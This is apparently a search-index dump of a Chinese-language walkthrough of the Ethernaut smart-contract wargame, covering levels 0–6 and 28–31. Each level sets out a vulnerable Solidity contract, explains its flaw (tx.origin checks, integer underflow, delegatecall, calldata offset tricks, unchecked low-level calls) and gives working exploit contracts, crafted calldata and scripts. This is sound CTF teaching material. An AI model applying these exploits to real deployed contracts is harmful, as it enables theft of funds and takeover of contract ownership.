\u5c06\u5bfc\u81f4\u4ea4\u6613\u5931\u8d25 if ( amount == 10 ) // \u533a\u5206 donate10() \u548c transferRemainder() revert NotEnoughBalance (); } } \u53c2\u8003\u8d44\u6599 \u00b6 Custom Errors in Solidity | Solidity Blog 28. Gatekeeper Three \u00b6 \u518d\u6b21\u6210\u4e3a entrant XD 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract SimpleTrick { GatekeeperThree public target ; address public trick ; uint private password = block . timestamp ; constructor ( address payable _target ) { target = GatekeeperThree ( _target ); } function checkPassword ( uint _password ) public returns ( bool ) { if ( _password == password ) { return true ; } password = block . timestamp ; return false ; } function trickInit () public { trick = address ( this ); } function trickyTrick () public { if ( address ( this ) == msg . sender && address ( this ) != trick ) { target . getAllowance ( password ); } } } contract GatekeeperThree { address public owner ; address public entrant ; bool public allow_enterance = false ; SimpleTrick public trick ; function construct0r () public { owner = msg . sender ; } modifier gateOne () { require ( msg . sender == owner ); require ( tx . origin != owner ); _ ; } modifier gateTwo () { require ( allow_enterance == true ); _ ; } modifier gateThree () { if ( address ( this ). balance > 0.001 ether && payable ( owner ). send ( 0.001 ether ) == false ) { _ ; } } function getAllowance ( uint _password ) public { if ( trick . checkPassword ( _password )) { allow_enterance = true ; } } function createTrick () public { trick = new SimpleTrick ( payable ( address ( this ))); trick . trickInit (); } function enter () public gateOne gateTwo gateThree returns ( bool entered ) { entrant = tx . origin ; return true ; } receive () external payable {} } \u8c03\u7528 GatekeeperThree.createTrick() \u521d\u59cb\u5316 trick 1 >> contract . createTrick (); GatekeeperThree.construct0r() \u7531\u4e8e typo \u6210\u4e3a\u666e\u901a\u51fd\u6570\uff0c\u53ef\u76f4\u63a5\u8c03\u7528\u53d8\u66f4 owner \uff0c\u4f7f\u7528\u5408\u7ea6\u8c03\u7528 GatekeeperThree.enter() \u80fd\u591f\u901a\u8fc7 gateOne gateTwo \u9700\u8981\u901a\u8fc7 GatekeeperThree.getAllowance() \u4f7f allow_enterance = true \uff0c\u7531 getStorageAt() \u83b7\u53d6 SimpleTrick.password \uff0c\u4ee5\u901a\u8fc7 trick.checkPassword() 1 2 >> web3 . eth . getStorageAt ( await contract . trick (), 2 ); \"0x0000000000000000000000000000000000000000000000000000000064047a80\" \u901a\u8fc7 gateThree \u9700\u8981\u5408\u7ea6 GatekeeperThree \u5185\u7684\u4f59\u989d\u5927\u4e8e 0.001 ether\uff0c\u4e14\u65e0\u6cd5\u5411 owner \u53d1\u9001 0.001 ether\uff08 owner \u4e0d\u63d0\u4f9b payable \u7684 receive \u6216 fallback \u51fd\u6570\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 interface IGatekeeperThree { function construct0r () external ; function getAllowance ( uint ) external ; function enter () external ; } contract Hack { function exploit ( address payable instance , uint pass ) external payable { instance . transfer ( 0.001001 ether ); IGatekeeperThree ( instance ). getAllowance ( pass ); IGatekeeperThree ( instance ). construct0r (); IGatekeeperThree ( instance ). enter (); } } 29. Switch \u00b6 Just have to flip the switch :) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Switch { bool public switchOn ; // switch is off bytes4 public offSelector = bytes4 ( keccak256 ( \"turnSwitchOff()\" )); modifier onlyThis () { require ( msg . sender == address ( this ), \"Only the contract can call this\" ); _ ; } modifier onlyOff () { // we use a complex data type to put in memory bytes32 [ 1 ] memory selector ; // check that the calldata at position 68 (location of _data) assembly { calldatacopy ( selector , 68 , 4 ) // grab function selector from calldata } require ( selector [ 0 ] == offSelector , \"Can only call the turnOffSwitch function\" ); _ ; } function flipSwitch ( bytes memory _data ) public onlyOff { ( bool success , ) = address ( this ). call ( _data ); require ( success , \"call failed :(\" ); } function turnSwitchOn () public onlyThis { switchOn = true ; } function turnSwitchOff () public onlyThis { switchOn = false ; } } \u9700\u8981\u901a\u8fc7 flipSwitch() \u8c03\u7528 turnSwitchOn() \uff0c\u800c onlyOff \u4fee\u9970\u7b26\u4f1a\u68c0\u67e5 calldata[68:52] \u5b57\u8282\u662f\u5426\u4e3a offSelector \u6b63\u5e38\u60c5\u51b5\u4e0b\u7f16\u7801\u7684 calldata \u6ca1\u529e\u6cd5\u7ed5\u8fc7 onlyOff \u7684\u68c0\u67e5\u8c03\u7528 turnSwitchOn() flipSelector _data offset _data length Selector 4 bytes 32 bytes 32 bytes 4 bytes \u4e0d\u8fc7\u53ef\u4ee5\u5c1d\u8bd5\u66f4\u6539 _data \u7684\u504f\u79fb\u91cf\uff0c\u5e76\u5c06 onSelector \u653e\u5728 offSelector \u4e4b\u540e flipSelector _data offset padding offSelector _data length onSelector 4 bytes 32 bytes 32 bytes 32 bytes 32 bytes 4 bytes \u90a3\u4e48\u8c03\u7528 flipSwitch() \u4f20\u5165\u7684 _data \u7f16\u7801\u5982\u4e0b 1 2 3 4 5 0000000000000000000000000000000000000000000000000000000000000060 # _data offset 0000000000000000000000000000000000000000000000000000000000000000 # padding 20606e1500000000000000000000000000000000000000000000000000000000 # offSelector 0000000000000000000000000000000000000000000000000000000000000004 76227e1200000000000000000000000000000000000000000000000000000000 \u5bf9\u4e8e\u52a8\u6001\u7c7b\u578b\u7684\u6570\u636e\uff0c\u5047\u8bbe\u5176\u5728 CALLDATA \u4e2d\u7684\u4f4d\u7f6e\u53ef\u80fd\u662f\u9519\u8bef\u7684 Exploit \u00b6 1 $ cast send <contract-address> --private-key <key> --rpc-url <rpc-url> 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000 30. HigherOrder \u00b6 Your objective is to become the Commander of the Higher Order! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // SPDX-License-Identifier: MIT pragma solidity 0.6.12 ; contract HigherOrder { address public commander ; uint256 public treasury ; function registerTreasury ( uint8 ) public { assembly { sstore ( treasury_slot , calldataload ( 4 )) } } function claimLeadership () public { if ( treasury > 255 ) commander = msg . sender ; else revert ( \"Only members of the Higher Order can become Commander\" ); } } treasury \u7684\u503c\u5927\u4e8e 255 \u5373\u53ef\u6210\u4e3a commander registerTreasury() \u53ef\u4ee5\u8bbe\u7f6e treasury \u7684\u503c\uff0c\u5c3d\u7ba1\u51fd\u6570\u672c\u8eab\u9650\u5236\u4e86\u53c2\u6570\u7c7b\u578b\uff0c\u4f46\u4f7f\u7528\u4e86 calldataload() \u6765\u52a0\u8f7d\u8c03\u7528\u53c2\u6570 calldataload(4) \u83b7\u53d6\u8c03\u7528\u6570\u636e\u4ece\u7b2c 4 \u5b57\u8282\u5f00\u59cb 32 \u5b57\u8282\u7684\u6570\u636e\uff0c\u56e0\u6b64\u8c03\u7528 registerTreasury() \u65f6\u4f20\u5165\u4efb\u610f\u5927\u4e8e 255 \u7684\u6570\u636e\u5373\u53ef 1 2 3 // registerTreasury(uint8): 0x211c85ab >> await contract . sendTransaction ({ data : \"211c85abff00000000000000000000000000000000000000000000000000000000000000\" }) >> await contract . claimLeadership () \u53c2\u8003\u8d44\u6599 \u00b6 Yul \u2014 Solidity documentation 31. Stake \u00b6 To complete this level, the contract state must meet the following conditions: The Stake contract's ETH balance has to be greater than 0 totalStaked must be greater than the Stake contract's ETH balance You must be a staker Your staked balance must be 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Stake { uint256 public totalStaked ; mapping ( address => uint256 ) public UserStake ; mapping ( address => bool ) public Stakers ; address public WETH ; constructor ( address _weth ) payable { totalStaked += msg . value ; WETH = _weth ; } function StakeETH () public payable { require ( msg . value > 0.001 ether , \"Don't be cheap\" ); totalStaked += msg . value ; UserStake [ msg . sender ] += msg . value ; Stakers [ msg . sender ] = true ; } function StakeWETH ( uint256 amount ) public returns ( bool ){ require ( amount > 0.001 ether , \"Don't be cheap\" ); (, bytes memory allowance ) = WETH . call ( abi . encodeWithSelector ( 0xdd62ed3e , msg . sender , address ( this ))); require ( bytesToUint ( allowance ) >= amount , \"How am I moving the funds honey?\" ); totalStaked += amount ; UserStake [ msg . sender ] += amount ; ( bool transfered , ) = WETH . call ( abi . encodeWithSelector ( 0x23b872dd , msg . sender , address ( this ), amount )); Stakers [ msg . sender ] = true ; return transfered ; } function Unstake ( uint256 amount ) public returns ( bool ){ require ( UserStake [ msg . sender ] >= amount , \"Don't be greedy\" ); UserStake [ msg . sender ] -= amount ; totalStaked -= amount ; ( bool success , ) = payable ( msg . sender ). call { value : amount }( \"\" ); return success ; } function bytesToUint ( bytes memory data ) internal pure returns ( uint256 ) { require ( data . length >= 32 , \"Data length must be at least 32 bytes\" ); uint256 result ; assembly { result := mload ( add ( data , 0x20 )) } return result ; } } \u7528\u6237\u6210\u4e3a\u8d28\u62bc\u8005\u4e4b\u540e\u8eab\u4efd\u4e0d\u4f1a\u88ab\u53d6\u6d88 \u901a\u8fc7 StakeWETH() \u53ef\u4ee5\u4f7f totalStaked \u589e\u52a0\u800c\u4e0d\u5f71\u54cd\u5408\u7ea6 Stake \u7684\u4f59\u989d\uff0c\u53e6\u5916\uff0c\u91c7\u7528\u4e86\u4f4e\u7ea7\u8c03\u7528\u6765\u8c03\u7528 WETH \u7684 transferFrom() \u4e14\u6ca1\u6709\u68c0\u67e5\u8fd4\u56de\u503c Unstake() \u53ea\u80fd\u53d6\u51fa\u5408\u7ea6\u4e2d\u7684\u4ee5\u592a\uff0c\u540c\u6837\u672a\u68c0\u67e5\u4f4e\u7ea7\u8c03\u7528\u7684\u8fd4\u56de\u503c \u8981\u540c\u65f6\u6ee1\u8db3\u7528\u6237\u8d28\u62bc\u6570\u91cf\u4e3a 0 \u4e14 totalStaked \u8981\u5927\u4e8e\u5408\u7ea6 Stake \u7684\u4f59\u989d\uff0c\u9700\u8981\u53e6\u4e00\u4e2a\u7528\u6237\u901a\u8fc7 StakeETH() \u8d28\u62bc\u4ee5\u592a\u5e01\u3002\u800c\u7528\u6237\u4f7f\u7528 StakeWETH() \u53ef\u4ee5\u5728\u4e0d\u6301\u6709 WETH \u7684\u60c5\u51b5\u4e0b\u589e\u52a0 totalStaked \u548c UserStake[msg.sender] \uff0c\u6700\u540e\u4f7f\u7528 Unstake() \u53d6\u51fa\u5176\u4ed6\u7528\u6237\u8d28\u62bc\u7684\u4ee5\u592a\u5e01\u5e76\u6e05\u7a7a\u8d28\u62bc Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 from cheb3 import Connection from cheb3.utils import compile_sol source = ''' interface IStake { function WETH() external view returns (address); function StakeETH() external payable; function StakeWETH(uint256 amount) external returns (bool); function Unstake(uint256 amount) external returns (bool); } interface IWETH { function approve(address spender, uint amount) external; } contract Helper { function stake(address _stake) payable external { IStake(_stake).StakeETH{value: msg.value}(); } } ''' compiled = compile_sol ( source , solc_version = \"0.8.0\" ) helper_abi , helper_bin = compiled [ \"Helper\" ] stake_abi , _ = compiled [ \"IStake\" ] weth_abi , _ = compiled [ \"IWETH\" ] conn = Connection ( \"<rpc-url>\" ) account = conn . account ( \"<private-key>\" ) stake_addr = \"<instance>\" helper = conn . contract ( account , abi = helper_abi , bytecode = helper_bin ) helper . deploy () helper . functions . stake ( stake_addr ) . send_transaction ( value = int ( 1e16 ) + 1 ) stake = conn . contract ( account , abi = stake_abi , address = stake_addr ) weth_addr = stake . caller . WETH () weth = conn . contract ( account , abi = weth_abi , address = weth_addr ) weth . functions . approve ( stake_addr , int ( 1e18 )) . send_transaction () stake . functions . StakeWETH ( int ( 1e16 )) . send_transaction () stake . functions . Unstake ( int ( 1e16 )) . send_transaction ()","title":"Ethernaut"},{"location":"wargames/ethernaut/#0-hello-ethernaut","text":"\u767b\u5f55 MetaMask\uff0c\u5c06 MetaMask \u5207\u6362\u5230 Goerli \u6d4b\u8bd5\u7f51\u7edc \u82e5\u6ca1\u6709\u5219\u9700\u8981\u5728 \u8bbe\u7f6e->\u9ad8\u7ea7 \u4e2d\u5f00\u542f\u300cShow test networks\u300d \u5728\u6d4f\u89c8\u5668\u7684\u63a7\u5236\u53f0\u53ef\u4ee5\u6536\u5230\u4e00\u4e9b\u6d88\u606f\uff0c\u5176\u4e2d\u4e00\u6761\u4e3a\u73a9\u5bb6\u5730\u5740 \u53ef\u4ee5\u4f7f\u7528 player \u547d\u4ee4\u968f\u65f6\u67e5\u770b\u73a9\u5bb6\u5730\u5740\uff0cMetaMask \u4e5f\u53ef\u4ee5\u76f4\u63a5\u590d\u5236 \u67e5\u770b\u5f53\u524d\u4f59\u989d\uff1a getBalance(player) \u5982\u679c\u663e\u793a pending \uff0c\u53ef\u6539\u7528 await getBalance(player) \u6765\u83b7\u5f97\u6e05\u6670\u7684\u7ed3\u679c 1 2 >> await getBalance ( player ) \"0\" \u5728\u63a7\u5236\u53f0\u8f93\u5165 ethernaut \u67e5\u770b\u6e38\u620f\u7684\u4e3b\u8981\u5408\u7ea6 \u5408\u7ea6\u7684 ABI\uff08Application Binary Interfaces\uff09\u63d0\u4f9b\u4e86\u6240\u6709 Ethernaut.sol \u7684\u516c\u5f00\u65b9\u6cd5\uff0c\u5982\u6240\u6709\u8005\uff0c\u53ef\u901a\u8fc7 ethernaut.owner() \u67e5\u770b \u5e76\u4e0d\u9700\u8981\u76f4\u63a5\u4e0e Ethernaut.sol \u5408\u7ea6\u4ea4\u4e92\uff0c\u800c\u662f\u901a\u8fc7\u5173\u5361\u5b9e\u4f8b \u83b7\u53d6\u6d4b\u8bd5\u7528\u4ee5\u592a\u5e01\u7528\u4e8e\u652f\u4ed8\u6c7d\u6cb9\u8d39\uff1a 1 / 2 / 3 / 4 \u70b9\u51fb\u300cGet new instance\u300d\u5e76\u5728 MetaMask \u6388\u6743\u4ea4\u6613 \u67e5\u770b\u5408\u7ea6\u4fe1\u606f\u5e76\u6839\u636e\u63d0\u793a\u4ea4\u4e92 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 >> await contract . info () \"You will find what you need in info1().\" >> await contract . info1 () \"Try info2(), but with \\\"hello\\\" as a parameter.\" >> await contract . info2 ( \"hello\" ) \"The property infoNum holds the number of the next info method to call.\" >> await contract . infoNum () { \"negative\" : 0 , \"words\" : [ 42 , null ], \"length\" : 1 , \"red\" : null } >> await contract . info42 () \"theMethodName is the name of the next method.\" >> await contract . theMethodName () \"The method name is method7123949.\" >> await contract . method7123949 () \"If you know the password, submit it to authenticate().\" >> await contract . password () \"ethernaut0\" >> await contract . authenticate ( \"ethernaut0\" ) // MetaMask \u6388\u6743\u4ea4\u6613\uff0c\u7b49\u5f85\u786e\u8ba4 >> await contract . getCleared () true \u67e5\u770b\u5408\u7ea6\u6240\u6709 ABI\uff1a contract.abi \u5b8c\u6210\u540e\u70b9\u51fb\u300cSubmit instance\u300d\u9a8c\u8bc1","title":"0. Hello Ethernaut"},{"location":"wargames/ethernaut/#1-fallback","text":"\u9605\u8bfb\u5408\u7ea6\u4ee3\u7801\u5e76\u8fbe\u6210\u4ee5\u4e0b\u76ee\u6807\uff1a \u83b7\u5f97\u5408\u7ea6\u7684\u6240\u6709\u6743 \u5c06\u5176\u4f59\u989d\u51cf\u4e3a 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; // Arithmetic operations revert on underflow and overflow // no need to use SafeMath after v0.8.0 contract Fallback { mapping ( address => uint ) public contributions ; address public owner ; constructor () { // \u6784\u9020\u51fd\u6570 owner = msg . sender ; // \u6240\u6709\u8005\u4e3a\u5f53\u524d\u8c03\u7528 contributions [ msg . sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg . sender == owner , \"caller is not the owner\" ); _ ; // only used inside a function modifier and it tells Solidity to execute the rest of the code. } function contribute () public payable { // msg.value - \u968f\u6d88\u606f\u53d1\u9001\u7684 wei \u7684\u6570\u91cf require ( msg . value < 0.001 ether ); contributions [ msg . sender ] += msg . value ; // \u6bcf\u6b21\u8f6c\u8d26\u4e0d\u80fd\u8d85\u8fc7 0.001 \u4ee5\u592a\u5e01\uff0c\u60f3\u8981\u8d85\u8fc7\u539f owner \u7684 1000 \u4ee5\u592a\u5e01 // \u9700\u8981\u91cd\u590d\u8c03\u7528\u591a\u6b21 contribute \u51fd\u6570\uff0c\u4e14\u6d4b\u8bd5\u8d26\u6237\u4e5f\u6ca1\u6709\u90a3\u4e48\u591a\u4ee5\u592a\u5e01\uff0c\u663e\u7136\u4e0d\u592a\u73b0\u5b9e if ( contributions [ msg . sender ] > contributions [ owner ]) { owner = msg . sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg . sender ]; } function withdraw () public onlyOwner { payable ( owner ). transfer ( address ( this ). balance ); // \u5408\u7ea6\u6240\u6709\u8005\u624d\u80fd\u5c06\u8d26\u6237\u4f59\u989d\u6e05\u96f6 } // \u4e00\u4e2a\u5408\u7ea6\u6700\u591a\u80fd\u6709\u4e00\u4e2a receive \u51fd\u6570\uff0c\u4e0d\u80fd\u6709\u53c2\u6570\u548c\u8fd4\u56de\u503c // \u5fc5\u987b\u58f0\u660e external \u548c payable // \u5f53\u8c03\u7528\u5408\u7ea6\u7684 data \u57df\u4e3a\u7a7a\u65f6\uff0c\u5c06\u4f1a\u6267\u884c\uff1b\u5982\u679c\u6ca1\u6709 receive \u51fd\u6570\uff0c\u5c06\u5c1d\u8bd5 fallback \u51fd\u6570 receive () external payable { require ( msg . value > 0 && contributions [ msg . sender ] > 0 ); owner = msg . sender ; } } \u6ce8\u610f\u5230\u82e5\u5f53\u524d\u4ea4\u6613\u8f6c\u8d26\u91d1\u989d\u5927\u4e8e 0 \u4e14\u8c03\u7528\u8005\u8d21\u732e\u4e0d\u4e3a 0 \u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 receive \u51fd\u6570\u53d6\u5f97\u5408\u7ea6\u6240\u6709\u6743 \u9996\u5148\u901a\u8fc7 contribute \u4f7f\u8d21\u732e\u503c\u5927\u4e8e 0 1 >> await contract . contribute ({ value : 1 }) \u5411\u5408\u7ea6\u8f6c\u8d26\u89e6\u53d1 receive \u51fd\u6570\uff0c\u6267\u884c\u5b8c\u6210\u540e\u786e\u8ba4\u4e00\u4e0b\u6240\u6709\u8005 1 2 3 4 5 >> await contract . send ( 1 ) // \u6216 >> await contract . sendTransaction ({ value : 1 }) // \u53d1\u8d77\u4e00\u4e2a\u4ea4\u6613 >> await contract . owner () \u6e05\u7a7a\u5408\u7ea6\u8d26\u6237\u7684\u4f59\u989d 1 >> await contract . withdraw ()","title":"1. Fallback"},{"location":"wargames/ethernaut/#_1","text":"Receive Ether Function sendTransaction","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#2-fallout","text":"\u58f0\u660e\u5408\u7ea6\u7684\u6240\u6709\u6743 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Fallout { using SafeMath for uint256 ; mapping ( address => uint ) allocations ; address payable public owner ; /* constructor */ function Fal1out () public payable { owner = msg . sender ; allocations [ owner ] = msg . value ; } // \u5728 v0.4.22 \u524d\uff0c\u6784\u9020\u51fd\u6570\u662f\u548c\u5408\u7ea6\u540c\u540d\u7684\u51fd\u6570\uff08v0.5.0 \u5f03\u7528\uff09 modifier onlyOwner { require ( msg . sender == owner , \"caller is not the owner\" ); _ ; } function allocate () public payable { allocations [ msg . sender ] = allocations [ msg . sender ]. add ( msg . value ); } function sendAllocation ( address payable allocator ) public { require ( allocations [ allocator ] > 0 ); allocator . transfer ( allocations [ allocator ]); } function collectAllocations () public onlyOwner { msg . sender . transfer ( address ( this ). balance ); } function allocatorBalance ( address allocator ) public view returns ( uint ) { return allocations [ allocator ]; } } \u88ab\u6ce8\u91ca\u4e3a\u300c\u6784\u9020\u51fd\u6570\u300d\u7684\u51fd\u6570\u540d\u4e3a Fal1out \u800c\u4e0d\u662f Fallout \u610f\u5473\u7740\u8be5\u51fd\u6570\u53ea\u662f\u666e\u901a\u51fd\u6570\u53ef\u4ee5\u88ab\u8c03\u7528 \u771f\u6b63\u7684\u6784\u9020\u51fd\u6570\u53ea\u5728\u5408\u7ea6\u521b\u5efa\u65f6\u8c03\u7528\u4e00\u6b21 1 >> await contract . Fal1out ()","title":"2. Fallout"},{"location":"wargames/ethernaut/#_2","text":"Constructors","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#3-coin-flip","text":"\u9700\u8981\u8fde\u7eed\u731c\u5bf9 10 \u6b21\u63b7\u786c\u5e01\u7684\u7ed3\u679c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { // block.number - \u5f53\u524d\u533a\u5757\u53f7 uint256 blockValue = uint256 ( blockhash ( block . number - 1 )); if ( lastHash == blockValue ) { revert (); // \u65e0\u6761\u4ef6\u629b\u51fa\u5f02\u5e38 } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; // \u5411\u4e0b\u53d6\u6574 bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u5b9e\u9645\u4e0a side \u7684\u503c\u5e76\u975e\u968f\u673a\uff0c\u533a\u5757\u53f7\u3001\u533a\u5757\u54c8\u5e0c\u7b49\u90fd\u662f\u516c\u5f00\u53ef\u83b7\u53d6\u7684 \u53ef\u4ee5\u7531\u53e6\u4e00\u4e2a\u5408\u7ea6\u8ba1\u7b97\u63b7\u786c\u5e01\u7684\u7ed3\u679c\uff0c\u5e76\u8c03\u7528 flip \u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; // \u628a\u9700\u8981\u8c03\u7528\u7684\u5408\u7ea6\u653e\u5728\u540c\u4e00\u4e2a\u6587\u4ef6 contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block . number - 1 )); // \u5f53\u524d\u533a\u5757\u53f7\u4e0d\u80fd\u7b49\u4e8e\u4e0a\u4e00\u533a\u5757\u53f7\uff0c\u610f\u5473\u7740\u4e0d\u80fd\u4f7f\u7528\u5faa\u73af\u91cd\u590d\u8c03\u7528 flip if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } contract hack { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; CoinFlip coin ; constructor ( address instance ) { coin = CoinFlip ( instance ); } function exploit () public { uint256 blockValue = uint256 ( blockhash ( block . number - 1 )); uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; coin . flip ( side ); } } \u4f7f\u7528 Remix \u90e8\u7f72\u5408\u7ea6 \u6267\u884c 10 \u6b21 exploit \u51fd\u6570 \u53ef\u4ee5\u4f7f\u7528 Chainlink VRF \u6765\u83b7\u5f97\u5b89\u5168\u7684\u968f\u673a\u6570","title":"3. Coin Flip"},{"location":"wargames/ethernaut/#_3","text":"Deploy & Run \u2014 Remix - Ethereum IDE 1 documentation","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#4-telephone","text":"\u58f0\u660e\u5408\u7ea6\u7684\u6240\u6709\u6743 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Telephone { address public owner ; constructor () public { owner = msg . sender ; } function changeOwner ( address _owner ) public { // tx.origin - \u4ea4\u6613\u7684\u53d1\u8d77\u8005 if ( tx . origin != msg . sender ) { owner = _owner ; } } } \u7528\u6237\u901a\u8fc7\u5408\u7ea6 A \u8c03\u7528\u5408\u7ea6 B \u5bf9\u4e8e\u5408\u7ea6 A\uff1a tx.origin \u548c msg.sender \u90fd\u662f\u7528\u6237 \u5bf9\u4e8e\u5408\u7ea6 B\uff1a tx.origin \u662f\u7528\u6237\uff0c msg.sender \u662f\u5408\u7ea6 A \u5f53\u4ea4\u6613\u53d1\u8d77\u8005\u7684\u5730\u5740\u4e0e\u5f53\u524d\u8c03\u7528\u8005\u7684\u5730\u5740\u4e0d\u76f8\u540c\u65f6\uff0c\u53ef\u4ee5\u66f4\u65b0\u5408\u7ea6\u6240\u6709\u8005\uff0c\u663e\u7136\u9700\u8981\u901a\u8fc7\u53e6\u4e00\u4e2a\u5408\u7ea6\u6765\u8c03\u7528 changeOwner 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Telephone { address public owner ; constructor () { owner = msg . sender ; } function changeOwner ( address _owner ) public { if ( tx . origin != msg . sender ) { owner = _owner ; } } } contract Hack { Telephone tele ; constructor ( address instance ) { tele = Telephone ( instance ); } function exploit () public { tele . changeOwner ( msg . sender ); } }","title":"4. Telephone"},{"location":"wargames/ethernaut/#5-token","text":"\u589e\u52a0\u624b\u4e2d token \u7684\u6570\u91cf\uff0c\u8d8a\u591a\u8d8a\u597d\uff08\u521d\u59cb 20 \u4e2a\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { // \u65e0\u7b26\u53f7\u6574\u6570\u7c7b\u578b mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg . sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg . sender ] - _value >= 0 ); // \u4f1a\u53d1\u751f\u6574\u6570\u6ea2\u51fa\uff0c\u672a\u4f7f\u7528 SafeMath \u68c0\u67e5 balances [ msg . sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u901a\u8fc7\u4e0b\u6ea2\u51fa\u6765\u83b7\u5f97 token 1 2 3 // \u8f6c\u7ed9\u9664\u81ea\u5df1\u5916\u7684\u4efb\u610f\u5730\u5740 // \u8f6c\u7ed9\u81ea\u5df1\u7684\u8bdd\uff0c\u5c31\u5148\u4e0b\u6ea2\u51fa\u518d\u4e0a\u6ea2\u51fa\u4e86... >> await contract . transfer ( < address > , 21 )","title":"5. Token"},{"location":"wargames/ethernaut/#6-delegation","text":"\u58f0\u660e\u5bf9\u5408\u7ea6\u5b9e\u4f8b\u7684\u6240\u6709\u6743 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Delegate { address public owner ; constructor ( address _owner ) { owner = _owner ; } function pwn () public { owner = msg . sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) { delegate = Delegate ( _delegateAddress ); owner = msg . sender ; } // \u6ca1\u6709 payable\uff0c\u4e0d\u80fd\u4f7f\u7528\u8f6c\u8d26\u6765\u89e6\u53d1 fallback // \u540c\u65f6\uff0c\u901a\u8fc7\u8f6c\u8d26\u6765\u89e6\u53d1 fallback \u51fd\u6570\u4e0d\u80fd\u52a0\u4efb\u4f55 data fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg . data ); if ( result ) { this ; } } } \u4ee3\u7406\u8c03\u7528\u53ea\u4f7f\u7528\u7ed9\u5b9a\u5730\u5740\u7684\u4ee3\u7801\uff0c\u5176\u4ed6\u5c5e\u6027\u90fd\u53d6\u81ea\u5f53\u524d\u5408\u7ea6 \u4f7f\u7528\u5408\u7ea6 Delegate \u7684 pwn \u51fd\u6570\u6765\u4fee\u6539\u5408\u7ea6 Delegation \u7684\u6240\u6709\u8005 